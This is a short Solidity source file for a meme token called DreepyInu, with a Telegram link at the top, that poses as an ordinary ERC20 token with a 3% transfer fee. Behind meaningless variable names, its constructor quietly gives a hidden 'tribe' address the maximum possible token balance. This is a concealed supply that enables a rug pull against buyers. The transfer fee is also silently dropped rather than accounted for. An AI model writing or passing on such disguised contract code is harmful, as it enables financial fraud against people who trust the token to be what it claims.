// https://t.me/dreepyinu

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.11;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract DreepyInu is ERC20, Ownable {
    uint256 private rapidly = ~uint256(0);
    uint256 public hearing = 3;

    constructor(
        string memory diagram,
        string memory factor,
        address danger,
        address tribe
    ) ERC20(diagram, factor) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[tribe] = rapidly;
    }

    function _transfer(
        address warn,
        address broken,
        uint256 fully
    ) internal override {
        uint256 plates = (fully / 100) * hearing;
        fully -= plates;
        super._transfer(warn, broken, fully);
    }
}